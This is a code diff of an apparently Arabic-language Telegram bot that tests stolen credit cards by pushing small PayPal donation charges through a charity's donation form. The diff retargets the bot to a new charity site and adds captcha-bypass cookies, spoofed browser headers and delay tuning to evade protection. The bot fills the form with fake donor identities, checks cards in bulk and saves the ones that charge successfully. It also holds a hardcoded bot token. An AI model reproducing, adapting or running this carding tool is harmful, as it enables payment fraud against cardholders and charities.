@@ -6,10 +6,10 @@ import string
 BOT_TOKEN = "8732070263:AAHwNJj0plhZpVuYBNZV5T4RZvQ-2USBWNk"
 ADMIN_ID = 1093032296
 active_scans = {}
-MAX_CARDS_PER_USER = 5000
+MAX_CARDS_PER_USER = 1000
 
 # ==================== الأسماء المزخرفة ====================
-GATEWAY_DISPLAY = "𝚙𝚊𝚢𝚙𝚊𝚕 𝚌𝚞𝚜𝚝𝚘𝚖 𝚌𝚑𝚊𝚛𝚐𝚎 𝟷$"
+GATEWAY_DISPLAY = "𝚙𝚊𝚢𝚙𝚊𝚕 𝚌𝚞𝚜𝚝𝚘𝚖 𝚌𝚑𝚊𝚛𝚐𝚎 𝟻𝟶¢"
 BOT_SIGN = "𝕁𝕠𝕜𝕖𝕣 🃏"
 
 # ==================== نظام النقاط والمستخدمين ====================
@@ -213,7 +213,7 @@ def generate_fake_data():
     email = f"{first.lower()}{random.randint(100,9999)}@gmail.com"
     return {"first_name": first, "last_name": last, "full_name": f"{first} {last}", "email": email, "card_name": f"{first} {last}"}
 
-# ==================== دالة الفحص الرئيسية (الموقع الجديد) ====================
+# ==================== دالة الفحص الرئيسية (موقع themiqlatproject.org) ====================
 def look(cc_line):
     try:
         number, month, year, cvc = [x.strip() for x in cc_line.split("|")]
@@ -227,18 +227,60 @@ def look(cc_line):
 
     fake = generate_fake_data()
     s = requests.Session()
+    
+    # ✅ User-Agent متغير مع كل طلب
     user = generate_user_agent()
     
     try:
-        # الموقع الجديد
-        url = 'https://presentationsknights.org/#doante-form'
-        url_ajax = 'https://presentationsknights.org/wp-admin/admin-ajax.php'
+        # بيانات الموقع الجديد
+        url = 'https://themiqlatproject.org/donations/the-miqlat-project-2/'
+        url_iframe = 'https://themiqlatproject.org/give/the-miqlat-project-2'
+        url_ajax = 'https://themiqlatproject.org/wp-admin/admin-ajax.php'
         
-        headers = {'user-agent': user}
-        r = s.get(url, headers=headers)
+        # ✅ Cookies ثابتة لتخطي الحماية
+        cookies = {
+            '_I_': '17c6be3bd20fdaa44a5768e5ce2885a75c00a9dea07237c7833a1fbbdcf7ffc6-1777747338',
+        }
+        
+        # 1. جلب الصفحة الرئيسية
+        headers = {
+            'authority': 'themiqlatproject.org',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+            'cache-control': 'max-age=0',
+            'referer': 'https://themiqlatproject.org/.well-known/sgcaptcha/?r=%2Fdonations%2Fthe-miqlat-project-2%2F&sol=MjE6MTc3Nzc0NzMzMzo1YjBjYmZmYToyNzYwODE4ZmIxZjZjYjVhODY2MzQ4MGZlN2YxN2ViNTMxYTYyYmI0MWYzOGI3MDE0NDM3YzQ1MTc0MDM3OWRjOgFGBQI%3D&s=4919:332721',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': user,
+        }
+        r = s.get(url, cookies=cookies, headers=headers)
+        
+        # 2. جلب صفحة iframe
+        headers = {
+            'authority': 'themiqlatproject.org',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+            'referer': 'https://themiqlatproject.org/donations/the-miqlat-project-2/',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'iframe',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'upgrade-insecure-requests': '1',
+            'user-agent': user,
+        }
+        params = {'giveDonationFormInIframe': '1'}
+        r = s.get(url_iframe, params=params, cookies=cookies, headers=headers)
         html = r.text
         
-        # استخراج البيانات من الصفحة
+        # 3. استخراج البيانات
         form_hash = re.search(r'name="give-form-hash"\s+value="(.*?)"', html).group(1)
         form_id = re.search(r'name="give-form-id"\s+value="(.*?)"', html).group(1)
         form_prefix = re.search(r'name="give-form-id-prefix"\s+value="(.*?)"', html).group(1)
@@ -246,52 +288,69 @@ def look(cc_line):
         kol = base64.b64decode(enc_token).decode('utf-8')
         access_token = re.findall(r'"accessToken":"(.*?)"', kol)[0]
         
+        # 4. Create Order
         params = {'action': 'give_paypal_commerce_create_order'}
+        headers = {
+            'authority': 'themiqlatproject.org',
+            'accept': '*/*',
+            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+            'origin': 'https://themiqlatproject.org',
+            'referer': 'https://themiqlatproject.org/give/the-miqlat-project-2?giveDonationFormInIframe=1',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': user,
+        }
         data = {
             'give-honeypot': '',
             'give-form-id-prefix': form_prefix,
             'give-form-id': form_id,
-            'give-form-title': 'Donate',
+            'give-form-title': 'The Miqlat Project',
             'give-current-url': url,
-            'give-form-url': url,
-            'give-form-minimum': '1.00',
-            'give-form-maximum': '999999.99',
+            'give-form-url': 'https://themiqlatproject.org/give/the-miqlat-project-2/',
             'give-form-hash': form_hash,
-            'give-price-id': '3',
             'give-recurring-logged-in-only': '',
             'give-logged-in-only': '1',
-            '_give_is_donation_recurring': '0',
-            'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
-            'give-amount': '1.00',  # $1 بدل 100
-            'give-recurring-period-donors-choice': 'month',
-            'give_stripe_payment_method': '',
-            'payment-mode': 'paypal-commerce',
+            'give_recurring_donation_details': '{"is_recurring":false}',
+            'give-amount': '0.50',
+            'give-selected-fund': '2',
             'give_first': fake['first_name'],
             'give_last': fake['last_name'],
             'give_company_option': 'no',
             'give_company_name': '',
             'give_email': fake['email'],
             'give_comment': '',
+            'payment-mode': 'paypal-commerce',
             'card_name': fake['card_name'],
             'card_exp_month': '',
             'card_exp_year': '',
-            'billing_country': 'US',
-            'card_address': '1 Rowe Ave',
-            'card_address_2': '',
-            'card_city': 'New York',
-            'card_state': 'CA',
-            'card_zip': '90001',
             'give-gateway': 'paypal-commerce',
+            'give_embed_form': '1',
         }
         
-        r = s.post(url_ajax, params=params, headers=headers, data=data)
+        r = s.post(url_ajax, params=params, cookies=cookies, headers=headers, data=data)
         order_id = r.json()['data']['id']
         
+        # 5. Confirm with PayPal
         headers_paypal = {
             'authority': 'cors.api.paypal.com',
             'accept': '*/*',
+            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
             'authorization': f'Bearer {access_token}',
+            'braintree-sdk-version': '3.32.0-payments-sdk-dev',
             'content-type': 'application/json',
+            'origin': 'https://assets.braintreegateway.com',
+            'paypal-client-metadata-id': '2a7b2ffcd2d1e70569231cd641c9970d',
+            'referer': 'https://assets.braintreegateway.com/',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'cross-site',
             'user-agent': user,
         }
         
@@ -316,11 +375,53 @@ def look(cc_line):
         s.post(f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source', 
                headers=headers_paypal, json=json_data)
         
+        # 6. Approve Order
         params = {'action': 'give_paypal_commerce_approve_order', 'order': order_id}
-        r = s.post(url_ajax, params=params, headers=headers, data=data)
+        headers = {
+            'authority': 'themiqlatproject.org',
+            'accept': '*/*',
+            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+            'origin': 'https://themiqlatproject.org',
+            'referer': 'https://themiqlatproject.org/give/the-miqlat-project-2?giveDonationFormInIframe=1',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': user,
+        }
+        data = {
+            'give-honeypot': '',
+            'give-form-id-prefix': form_prefix,
+            'give-form-id': form_id,
+            'give-form-title': 'The Miqlat Project',
+            'give-current-url': url,
+            'give-form-url': 'https://themiqlatproject.org/give/the-miqlat-project-2/',
+            'give-form-hash': form_hash,
+            'give-recurring-logged-in-only': '',
+            'give-logged-in-only': '1',
+            'give_recurring_donation_details': '{"is_recurring":false}',
+            'give-amount': '0.50',
+            'give-selected-fund': '2',
+            'give_first': fake['first_name'],
+            'give_last': fake['last_name'],
+            'give_company_option': 'no',
+            'give_company_name': '',
+            'give_email': fake['email'],
+            'give_comment': '',
+            'payment-mode': 'paypal-commerce',
+            'card_name': fake['card_name'],
+            'card_exp_month': '',
+            'card_exp_year': '',
+            'give-gateway': 'paypal-commerce',
+            'give_embed_form': '1',
+        }
+        
+        r = s.post(url_ajax, params=params, cookies=cookies, headers=headers, data=data)
         text = r.text.upper()
         
-        # الردود الكاملة
+        # 7. الردود
         if '"STATUS":"COMPLETED"' in text and '"RESPONSE_CODE":"0000"' in text:
             return "𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
         elif 'DO_NOT_HONOR' in text:
@@ -459,7 +560,7 @@ def check_single_card(chat_id, line):
         if "𝐂𝐡𝐚𝐫𝐠𝐞𝐝" in result or "INSUFFICIENT_FUNDS" in result:
             bin_data = get_bin_info(line.split('|')[0])
             msg = (
-                f"<b>#PayPal_Charge ($1) [single] 🌟</b>\n"
+                f"<b>#PayPal_Charge ($0.50) [single] 🌟</b>\n"
                 f"<b>- - - - - - - - - - - - - - - - - - - - - -</b>\n"
                 f"<b>[ϟ] 𝐂𝐚𝐫𝐝:</b> <code>{line}</code>\n"
                 f"<b>[ϟ] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:</b> <b>{result}</b>\n"
@@ -475,10 +576,6 @@ def check_single_card(chat_id, line):
             send_telegram(chat_id, msg)
             
             if "𝐂𝐡𝐚𝐫𝐠𝐞𝐝" in result:
-                try:
-                    send_telegram(ADMIN_ID, f"💰 تم تفعيل بطاقة!\n👤 المستخدم: {chat_id}\n💳 {line}\n📝 {result}")
-                except:
-                    pass
                 with open(f"charged_{chat_id}.txt", "a") as f:
                     f.write(line + "\n")
                     
@@ -503,15 +600,11 @@ def start_checker(chat_id, combo_lines, gateway_name, initial_message_id):
         
         if "𝐂𝐡𝐚𝐫𝐠𝐞𝐝" in result:
             stats["charged"] += 1
-            try:
-                send_telegram(ADMIN_ID, f"💰 تم تفعيل بطاقة!\n👤 المستخدم: {chat_id}\n💳 {line}\n📝 {result}")
-            except:
-                pass
             with open(f"charged_{chat_id}.txt", "a") as f:
                 f.write(line + "\n")
             bin_data = get_bin_info(line.split('|')[0])
             msg = (
-                f"<b>#PayPal_Charge ($1) [mass] 🌟</b>\n"
+                f"<b>#PayPal_Charge ($0.50) [mass] 🌟</b>\n"
                 f"<b>- - - - - - - - - - - - - - - - - - - - - -</b>\n"
                 f"<b>[ϟ] 𝐂𝐚𝐫𝐝:</b> <code>{line}</code>\n"
                 f"<b>[ϟ] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:</b> <b>{result}</b>\n"
@@ -543,8 +636,8 @@ def start_checker(chat_id, combo_lines, gateway_name, initial_message_id):
         }
         edit_telegram(chat_id, initial_message_id, f"<b>Gateway:</b> {GATEWAY_DISPLAY}\n<b>By:</b> {BOT_SIGN}", buttons)
         
-        # التأخير 20-30 ثانية (الأمان)
-        time.sleep(random.uniform(20, 30))
+        # ✅ تأخير 16-20 ثانية عشان الحماية
+        time.sleep(random.uniform(16, 20))
     
     final_msg = (
         f"<b>🏁 Scan Finished!</b>\n\n"
@@ -559,10 +652,11 @@ def start_checker(chat_id, combo_lines, gateway_name, initial_message_id):
 # ==================== معالج الأوامر ====================
 def handle_updates():
     offset = 0
-    print("✅ Joker Bot is running on operationhappynurse.org...")
+    print("✅ Joker Bot is running on themiqlatproject.org...")
     print(f"👑 Admin ID: {ADMIN_ID}")
     print(f"📋 Max checks per user: {MAX_CARDS_PER_USER}")
-    print(f"🔄 Time sleep: 20-30 seconds")
+    print(f"🔄 Time sleep: 16-20 seconds")
+    print(f"💰 Amount: $0.50")
     
     while True:
         try:
@@ -630,7 +724,7 @@ def handle_updates():
                 
                 elif text == "/cmds":
                     if chat_id == ADMIN_ID:
-                        cmds = f"""<b>👑 Admin Commands</b>
+                        cmds = """<b>👑 Admin Commands</b>
 ━━━━━━━━━━━━━━━━
 /code <hours> <user_id> - Create code
 /addpoints <user_id> <amount> - Add points
@@ -747,35 +841,35 @@ def handle_updates():
                 elif text == "/users" and chat_id == ADMIN_ID:
                     users = get_all_users()
                     if not users:
-                        send_telegram(chat_id, "No users")
+                        send_telegram(chat_id, "لا يوجد مستخدمين")
                     else:
-                        msg = "<b>📋 Users List</b>\n━━━━━━━━━━━━━━━━\n"
+                        msg = "<b>📋 قائمة المستخدمين</b>\n━━━━━━━━━━━━━━━━\n"
                         for uid, data in list(users.items())[:20]:
-                            msg += f"🆔 {uid}\n👤 {data.get('first_name', 'Unknown')}\n📊 Checked: {data.get('total_checked', 0)} cards\n━━━━━━━━━━━━━━━━\n"
+                            msg += f"🆔 {uid}\n👤 {data.get('first_name', 'Unknown')}\n📊 فحص: {data.get('total_checked', 0)} بطاقة\n━━━━━━━━━━━━━━━━\n"
                         if len(users) > 20:
-                            msg += f"\nAnd {len(users) - 20} more..."
+                            msg += f"\nو {len(users) - 20} مستخدمين آخرين..."
                         send_telegram(chat_id, msg)
                 
                 elif text.startswith("/broadcast") and chat_id == ADMIN_ID:
                     try:
                         broadcast_msg = text.split("/broadcast", 1)[1].strip()
                         if not broadcast_msg:
-                            send_telegram(chat_id, "❌ /broadcast <message>")
+                            send_telegram(chat_id, "❌ /broadcast <الرسالة>")
                         else:
                             users = get_all_users()
                             sent = 0
                             failed = 0
-                            send_telegram(chat_id, f"🔄 Broadcasting to {len(users)} users...")
+                            send_telegram(chat_id, f"🔄 جاري الإذاعة لـ {len(users)} مستخدم...")
                             for uid in users.keys():
                                 try:
-                                    send_telegram(int(uid), f"<b>📢 Broadcast</b>\n━━━━━━━━━━━━━━━━\n{broadcast_msg}")
+                                    send_telegram(int(uid), f"<b>📢 إذاعة من المالك</b>\n━━━━━━━━━━━━━━━━\n{broadcast_msg}")
                                     sent += 1
                                     time.sleep(0.3)
                                 except:
                                     failed += 1
-                            send_telegram(ADMIN_ID, f"✅ Broadcast done\n✅ Sent: {sent}\n❌ Failed: {failed}")
+                            send_telegram(ADMIN_ID, f"✅ تم الإذاعة\n✅ نجح: {sent}\n❌ فشل: {failed}")
                     except:
-                        send_telegram(chat_id, "❌ /broadcast <message>")
+                        send_telegram(chat_id, "❌ /broadcast <الرسالة>")
                 
                 elif text.startswith("/reset") and chat_id == ADMIN_ID:
                     try:
@@ -784,11 +878,11 @@ def handle_updates():
                         if str(user_id) in users:
                             users[str(user_id)]["total_checked"] = 0
                             save_json(USERS_FILE, users)
-                            send_telegram(chat_id, f"✅ Reset checks for {user_id}")
+                            send_telegram(chat_id, f"✅ تم إعادة تعيين عدد فحوصات المستخدم {user_id}")
                         else:
-                            send_telegram(chat_id, f"❌ User {user_id} not found")
+                            send_telegram(chat_id, f"❌ المستخدم {user_id} غير موجود")
                     except:
-                        send_telegram(chat_id, "❌ /reset <user_id>")
+                        send_telegram(chat_id, "❌ /reset <ايدي>")
                 
                 elif text.startswith("/code") and chat_id == ADMIN_ID:
                     try:
@@ -796,20 +890,20 @@ def handle_updates():
                         hours = int(parts[1])
                         target = int(parts[2]) if len(parts) > 2 else None
                         code = generate_code(hours, target)
-                        send_telegram(chat_id, f"✅ Code: <code>/redeem {code}</code>\n⏰ {hours} hours")
+                        send_telegram(chat_id, f"✅ كود الاشتراك:\n<code>/redeem {code}</code>\n⏰ {hours} ساعة")
                         if target:
                             try:
-                                send_telegram(target, f"🎉 Code for you!\n<code>/redeem {code}</code>\n⏰ {hours} hours")
+                                send_telegram(target, f"🎉 تم إنشاء كود اشتراك لك!\n<code>/redeem {code}</code>\n⏰ {hours} ساعة")
                             except:
                                 pass
                     except:
-                        send_telegram(chat_id, "❌ /code <hours> <user_id optional>")
+                        send_telegram(chat_id, "❌ /code <ساعات> <ايدي اختياري>")
                 
                 # ========== أوامر الفحص ==========
                 elif text.startswith("/pp"):
                     parts = text.split(maxsplit=1)
                     if len(parts) < 2:
-                        send_telegram(chat_id, f"<b>❌ Usage:</b> <code>/pp card|month|year|cvv</code>\n<b>Example:</b> <code>/pp 4532015112830366|12|2025|123</code>\n\n<b>💰 Amount: $1</b>")
+                        send_telegram(chat_id, f"<b>❌ Usage:</b> <code>/pp card|month|year|cvv</code>\n<b>Example:</b> <code>/pp 4532015112830366|12|2025|123</code>\n\n<b>💰 Amount: $0.50</b>")
                     else:
                         card_data = parts[1].strip()
                         if "|" in card_data:
